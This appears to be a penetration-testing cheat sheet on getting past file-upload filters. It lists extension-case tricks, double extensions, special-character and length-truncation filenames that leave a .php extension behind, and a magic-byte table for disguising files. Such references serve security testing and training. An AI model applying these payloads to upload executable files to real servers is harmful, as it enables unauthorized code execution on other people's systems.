# File upload

## Bypass file extension checks

### Uppercase letters
Change the extension names to uppercase letters.
```
.pHp
.PHP
.Php
```

### Double extensions and junk data
Adding a decoy extension before the real one
```
file.png.php
```
Adding (junk) meaningless data in front of the extension
```
file.#.png
file.phpjunkDatapng
file.php%0a.png
```

### Special characters
```
file.php/
file.php....
file.
file.php%20
```


### Breaking filename length
1. Try what the maximum length accepted for the file name is, by  adding a bunch of A's to the file name with the extension at the end.   *(linux maximum is 255 bytes)*
2.  Upload the file and see how many characters it allows.
3. Add a valid and a `.php` extension to the file. Make it so that the valid extension gets cut off and the `.php` extension remains.
```
# Assume max file length is 255
## 251 A's and .php extension add up to 255
AAA< SNIP 251 >AAA.php.png

# This way, the .png gets cut off and leaves the .php
```



## Magic bytes
If an application uses the file's magic bytes to determine the `Content-Type` one can easily bypass it with changing the files magic bytes.

**Table of magic bytes**
```
GIF     GIF89a;\x0a
JPG     \xFF\xD8\xFF\xDB
PNG     \x89\x50\x4E\x47\x0D\x0A\x1A\x0A
TAR     \x75\x73\x74\x61\x72\x00\x30\x30
```

1. Open the file in `hexeditor`:
	```bash
	hexeditor <file>
	```
2.  Edit the first few bytes so that it fits the file type of your choice.
	```
	# In hexeditor (original)
	00 00 00 00

	# In hexeditor (changed to JPG)
	FF D8 FF DB
	```